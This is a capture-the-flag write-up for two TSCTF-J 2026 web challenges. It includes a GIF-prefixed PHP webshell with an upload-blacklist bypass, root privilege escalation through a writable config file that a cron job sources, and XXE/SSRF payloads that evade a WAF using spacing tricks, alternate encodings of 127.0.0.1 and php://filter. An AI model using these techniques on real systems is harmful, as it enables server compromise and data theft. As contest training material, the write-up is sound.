---
title: 【补充】TSCTF-J 2026 Writeup
published: 2026-10-17
updated: 2026-10-22
description: 对 TSCTF-J 2026 未解出题目的补充WP
tags:
  - CTF
  - WP
category: CTF
draft: false
---

对 **TSCTF-J 2026** 未解出题目的补充WP ~~（在努力做题了）~~

会一直更新 ~~（大概）~~

# **题目：玛德莱娜小蛋糕**

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/image-1.png)

进入主页面发现一个 *存入相册* 的按钮，考虑到这是一个低难度web题，猜测是一句话木马类型。

先用dirsearch进行扫描，只得到三个301响应的端口/assets,/data,/storage

尝试访问但是均被 403 Forbidden，那应该不会存在相关文件 ~~（其实是网络炸了扫不了了）~~

再用arjun盲扫一下网页也只返回唯一一个表单参数photo，所以先不考虑LFI文件包含，排除该方向。

回到上传文件本身

新建一个gif文件，写入木马（我们使用短标签 `<?` ，因为 `<?php` 被WAF）

```php
GIF89a<? @eval($_POST['ant']); ?>
```

通过brup上传，抓包改php文件类型

发现 `php / php5 / phar / php7` 被拒，

`.phtml、.pht、.shtml、.cgi、.htaccess` 等原样保存

使用 `.phtml` 上传文件，文件被转存为 **随机数+.phtml** 的格式，并且可静态访问

```url
http://53665a4675446e5473505a497a45326f464336546d-p80.chal.buptmerak.cn/storage/tmp/08767c30da72.phtml?c=id
```

尝试使用蚁剑进入文件夹，成功

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/image-2.png)

不过浏览了一会发现报错了，回到网页发现404，结合tmp路径，猜测文件被清理

所以重复过程，速战速决。

在根目录发现不可修改的`entrypoint.sh`，进去找找提示

```bash
#!/bin/bash
# NOTE: intentionally NO `set -e`.
# This script must always reach `exec apache2-foreground`, otherwise the
# container exits, the platform drops the gateway route, and the browser only
# shows a confusing "ERR_CONNECTION_CLOSED" with no way to see why.
# A reachable-but-misconfigured instance is far easier to debug than a
# crash-looping one.
set -uo pipefail

# ---------------------------------------------------------------------------
# 1) Persist the platform-injected flag as a root-only file.
#    Never write a fallback value: a fixed flag would be a free flag for
#    everyone, which is worse than having no flag at all.
# ---------------------------------------------------------------------------
if [ -z "${FLAG:-}" ]; then
    echo "[entrypoint] ==========================================================" >&2
    echo "[entrypoint] ERROR: FLAG is empty / was not injected by the platform." >&2
    echo "[entrypoint] /flag will NOT be created -> nobody can obtain the flag." >&2
    echo "[entrypoint] Fix: choose 动态flag(Leet 或 UUID) and click 保存&编译." >&2
    echo "[entrypoint] Continuing WITHOUT /flag so this instance stays reachable" >&2
    echo "[entrypoint] (you should still see the upload page when you open it)." >&2
    echo "[entrypoint] ==========================================================" >&2
else
    if printf '%s\n' "$FLAG" > /flag; then
        chown root:root /flag 2>/dev/null || true
        chmod 600 /flag 2>/dev/null || true
    else
        echo "[entrypoint] ERROR: could not write /flag (read-only mount?)." >&2
        echo "[entrypoint]        If the platform injects the flag another way, make" >&2
        echo "[entrypoint]        sure that file is still root-only (0600)." >&2
    fi

    # Remove FLAG from the environment BEFORE anything long-lived starts, so it
    # can never show up in /proc/<pid>/environ:
    #   - `service cron start` forks a daemon that would otherwise inherit it
    #     (and pass it on to every cron job, including the ones the player
    #     triggers);
    #   - the final `exec` replaces PID 1, so /proc/1/environ is clean too.
    unset FLAG
fi

# ---------------------------------------------------------------------------
# 2) cron is the intended solution path. If the runtime refuses to run it the
#    challenge becomes unsolvable, so make that loud -- but do not kill the
#    container over it.
# ---------------------------------------------------------------------------
if ! service cron start; then
    echo "[entrypoint] WARNING: 'service cron start' failed; the challenge will be unsolvable" >&2
fi
if command -v pgrep >/dev/null 2>&1 && ! pgrep -x cron >/dev/null 2>&1; then
    echo "[entrypoint] WARNING: cron daemon is not running; the challenge will be unsolvable" >&2
fi

# ---------------------------------------------------------------------------
# 3) exec: PID 1 must be apache itself (not this shell), which also gives it a
#    freshly built environment block with no FLAG entry.
# ---------------------------------------------------------------------------
if [ -f /flag ]; then
    echo "[entrypoint] starting apache (flag file: present, $(stat -c '%A %U:%G' /flag 2>/dev/null))" >&2
else
    echo "[entrypoint] starting apache (flag file: MISSING -> this instance is broken)" >&2
fi
exec apache2-foreground
```

可以发现有很多注释和flag相关内容，看43段

    # 2) cron is the intended solution path. If the runtime refuses to run it the
    challenge becomes unsolvable, so make that loud -- but do not kill the
    container over it.

可知 **cron（定时任务）** 是预期的解题路径

去到`/etc`找到一个`cron.d`文件夹，里面有`teahouse-cleanup`文件，写着

```cron
* * * * * root /bin/bash /opt/teahouse/bin/clean_uploads.sh >> /var/log/
teahouse-cleanup.log 2>&1
```

这个复写是以 **root** 权限运行的，也许可以利用一下。

再去到`/opt/teahouse/bin/clean_uploads.sh`，里面写着

```bash
#!/bin/bash
set -u

UPLOAD_DIR="/var/www/html/storage/tmp"
PROFILE_FILE="/var/lib/teahouse/cleanup.conf"

if [ ! -d "$UPLOAD_DIR" ]; then
    exit 0
fi

if [ -f "$PROFILE_FILE" ]; then
    source "$PROFILE_FILE"
fi

# The teahouse keeps albums tidy by sweeping oversized or stale temporary desserts.
find "$UPLOAD_DIR" -type f -size +"${MAX_UPLOAD_SIZE:-1M}" -delete
find "$UPLOAD_DIR" -type f -mmin +"${UPLOAD_TTL_MINUTES:-3}" -delete
```

第12段有个`source`，引用的是`/var/lib/teahouse/cleanup.conf`

由于`teahouse-cleanup`以 **root权限** 执行`clean_uploads.sh`，而`clean_uploads.sh`又以`source`执行了`cleanup.conf`，所以`cleanup.conf`就是以 **root权限** 执行的。

追踪到`/var/lib/teahouse/cleanup.conf`，发现当前权限可修改

里面写着

```bash
MAX_UPLOAD_SIZE=1M
UPLOAD_TTL_MINUTES=3
```

我们往里面追加内容

```bash
cat /flag > /var/www/html/storage/tmp/flagout.txt
```

目的是让`/flag`的内容写入到`flagout.txt`的文件中，过一分钟之后就有`flagout.txt`文件出现了

一分钟后打开`flagout.txt`得到 **TSCTF-J{cR07-1N_534rbH-OF-10sT-b@K3-a7d_f13Gc98433b}**

整体思路： ~~（只有此处为AI生成）~~

1. **上传木马** -> 绕过前端和黑名单，拿到 `www-data` 权限。
2. **信息收集** -> 阅读 `entrypoint.sh`，发现 Cron 提权是官方指定路线。
3. **寻找弱点** -> 发现 `cleanup.conf` 是高权限加载（`source`）的低权限可写文件。
4. **借刀杀人** -> 把 `cat /flag > ...` 塞进配置，让 root 帮你当“搬运工”。

---

# **题目：MinePortrait**

## 正文

进入题目环境 见登录界面

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/4e9da50bb48a48a281594dc0f26d8b30.png)

用**dirsearch**扫一遍，发现有隐藏端口

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/8b033252dabfc55dbb1643afeaf9bbee.png)

依次访问

**/healthz**返回 **“ok”**

**/robots.txt**返回有效内容

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/52549275338a7285d32457c8f2bc88e2.png)

追踪到 **/www.zip**，直接下载到了文件，解压得到两个文件

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/image-8.png)

打开**login_source.py**

```python
# leaked login source
USERNAME = "m0rnis"
PASSWORD = "passw0rd"

def check_login(username, password):
    if username == USERNAME and password == PASSWORD:
        return True
    return False
```

是泄露的账号密码。

再看看**old_note.txt**

    old_note.txt
    Pelican Town workshop internal notes
    private media helper:
    service = 127.0.0.1
    route = /fetch.php
    query = url
    flag in flag.txt
    The media helper is only reachable from the workshop network.
    It was kept for legacy artwork imports used by older portrait tools.

可以看到 **"media helper"** 只能从内网 **127.0.0.1**访问：***与SSRF有关***。

并且提到了 **/fetch.php**，那么后续拼payload大概率要用到。

使用**m0rnis**和**passw0rd**登录进入网站。

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/image-9.png)

发现有上传文件的地方，随便找一张照片进行格式转化，发现**burp**抓不到包，判断有直接的**前端图片转化器**，不过服务器

开**F12**看html源码找找隐藏信息，发现有一段**隐藏起来的javascript**

```javascript

const form = document.querySelector("#converter-form");
const fileInput = document.querySelector("#image");
const sourceSelect = document.querySelector("#source_format");
const targetSelect = document.querySelector("#target_format");
const preview = document.querySelector("#preview");
const statusBox = document.querySelector("#client-status");
const download = document.querySelector("#download-link");

const mimeByTarget = {
  png: "image/png",
  jpg: "image/jpeg",
  webp: "image/webp"
};

function setStatus(message, isError = false) {
  statusBox.textContent = message;
  statusBox.style.color = isError ? "#9d241b" : "#64725d";
}

function filenameFor(original, target) {
  const stem = original.replace(/\.[^.]+$/, "") || "portrait";
  return `${stem}.${target === "jpg" ? "jpg" : target}`;
}

function blobToText(blob) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve(String(reader.result || ""));
    reader.onerror = reject;
    reader.readAsText(blob);
  });
}

function loadImageFromFile(file) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => resolve(img);
    img.onerror = () => reject(new Error("The browser could not decode this image format."));
    img.src = URL.createObjectURL(file);
  });
}

function canvasToBlob(canvas, mime) {
  return new Promise((resolve) => canvas.toBlob(resolve, mime, mime === "image/jpeg" ? 0.92 : undefined));
}

form.addEventListener("submit", async (event) => {
  const file = fileInput.files[0];
  const source = sourceSelect.value;
  const target = targetSelect.value;

  if (!source || !target) {
    event.preventDefault();
    setStatus("Choose both a source format and a target format.", true);
    return;
  }

  if (!file) {
    return;
  }

  if (source === "svg" && target === "png") {
    const text = await blobToText(file);
    if (/<!\s*(doctype|entity)|SYSTEM\s+["']/i.test(text)) {
      setStatus("Sending SVG to the workshop renderer...");
      return;
    }
  }

  event.preventDefault();

  if (!mimeByTarget[target]) {
    setStatus("This browser can export PNG, JPG, and WEBP portraits.", true);
    return;
  }

  try {
    setStatus("Converting locally in your browser...");
    const img = await loadImageFromFile(file);
    const canvas = document.createElement("canvas");
    const maxSide = 900;
    const scale = Math.min(1, maxSide / Math.max(img.naturalWidth || img.width, img.naturalHeight || img.height));
    canvas.width = Math.max(1, Math.round((img.naturalWidth || img.width) * scale));
    canvas.height = Math.max(1, Math.round((img.naturalHeight || img.height) * scale));
    const ctx = canvas.getContext("2d");
    ctx.fillStyle = "#fffdf3";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);

    const converted = await canvasToBlob(canvas, mimeByTarget[target]);
    if (!converted) {
      throw new Error("The browser refused to export that target format.");
    }

    const url = URL.createObjectURL(converted);
    preview.innerHTML = "";
    preview.appendChild(canvas);
    download.href = url;
    download.download = filenameFor(file.name, target);
    download.style.display = "block";
    setStatus(`Converted ${source.toUpperCase()} to ${target.toUpperCase()} locally.`);
  } catch (error) {
    setStatus(error.message, true);
  }
});
```

重点看这一部分

```javascript
if (source === "svg" && target === "png") {
    const text = await blobToText(file);
    if (/<!\s*(doctype|entity)|SYSTEM\s+["']/i.test(text)) {
      setStatus("Sending SVG to the workshop renderer...");
      return;
    }
  }
```

当**svg**转**png**时，如果svg图片的text撞到了正则表达式，就会被发送给服务端。可以肯定这里就是入手点。 ~~（笔者起初理解成撞了正则就不发送服务端，然后怎么也过不了）~~

---

**svg**本质是一种**xml**，那么就可能存在**xxe实体注入**，往这个方向靠。（这里引用一下[Hello CTF](https://hello-ctf.com/hc-skill/web/xxe/)的内容）

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/image-10.png)

看到这个之后，笔者本来想去找P.W.N.CTF 2018的相关WP，但是似乎没找到（大概是没仔细找）

---

回到题目本身，刚才的正则表达式有个很特殊的地方，`<!`的后面跟了一个`\s*`，表示可以**加空格**（后面payload要考）

有了以上信息，我们先尝试发送第一个payload，往XXE和SSRF方向上靠

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://127.0.0.1/fetch.php?url=/flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="900" height="520">
  <text x="10" y="40">&xxe;</text>
</svg>
```

回显

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/image-11.png)

明显被WAF了，让我们 **"Go refine it!"**

正所谓**出题人不会给没有用的信息** ~~（雾）~~，前面说过可以在 `<!DOCTYPE` 和 `<!ENTITY` 之中插入空格，我们据此改进payload后，得到回显

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/image-4.png)

说明成功绕过了一层WAF，但是还有一层。这时候可以结合一下出题师傅给的提示

    祝尼魔们会拦下不少本机地址，却会收下用filter包好的信。

**“会拦下不少本机地址”**：所以`127.0.0.1`肯定是首当其冲，我们尝试换其他等价的host，例如`0.0.0.0`或者`localhost`，但是都被拦截了，再用更复杂一些的 `2130706433` （十进制整数）或者 `0x7F000001`（十六进制）

**“收下用filter包好的信”**：使用**php://filter**包裹自己的url

基于以上两个提示，我们可以把payload换成

```xml
<?xml version="1.0" encoding="UTF-8"?>
<! DOCTYPE svg [
  <! ENTITY xxe SYSTEM "http://0/fetch.php?url=php://filter/resource=/flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="900" height="520">
  <text x="10" y="40">&xxe;</text>
</svg>
```

得到

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/image-12.png)

一堆报错信息后面直接拿到flag

**TSCTF-J{f1a3053b-6b99-c67d-235b-7275451b5c7d}**

---

## 后日谈

***1.还有哪些优秀的 127.0.0.1等价host？***


dsh帮我测了一堆和**127.0.0.1**等价的host出来

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/image-13.png)

---

***2.没有提示之前怎么想到用filter包裹php？***

DSH老师回答如下：

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/image-14.png)

---

## 个人联想

笔者针对为什么能直接更改127.0.0.1的进制表示从而绕过WAF进行了一定探究。发现了一些可能存在的**历史渊源** ~~（大概只是过度解读）~~

为什么当我们输入`2130706433`或者`0x7F000001`时为什么服务端能正确解析出`127.0.0.1`？

去问DS老师，得到回答如下

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/image-15.png)

**legacy**一词引起了笔者的注意，因为前面的**old_note.txt**中也出现了**legacy**一词

    It was kept for legacy artwork imports used by older portrait tools.
    大意：它被保留用于旧版肖像工具所使用的旧美术资源导入。

**“旧版”**？

于是我去追问DS: **"inet_aton是现代服务器都有的吗?"**

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/image-16.png)

![alt text](/posts-images/补充-TSCTF-J-2026-Writeup/image-17.png)

看来大概是 **“旧版肖像工具”** 使用了已经被时代遗弃的 **“inet_aton”** ，导致了漏洞的发生。

***以上联想纯属笔者自己捏造，无出题师傅证明，当个小故事看吧。***
